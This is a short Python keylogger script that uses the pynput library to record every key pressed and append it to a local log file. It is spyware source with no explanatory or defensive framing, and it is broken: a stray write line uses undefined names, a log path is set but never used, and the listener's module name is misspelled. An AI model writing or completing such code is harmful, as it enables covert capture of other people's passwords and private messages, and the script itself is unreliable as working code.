from pynput import keyboard 
import os 
import time

f.write (f"{time.ctime()}: {key.char}\n")
log_path = os.path.expanduser("~/.keylog.txt")

def on_press(key):
    try:
        with open("log.txt","a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("log.txt", "a") as f:
            f.write(f"[{key}]")

#listener 
with kebyboard.Listener(on_press= on_press) as listener:
    listener.join()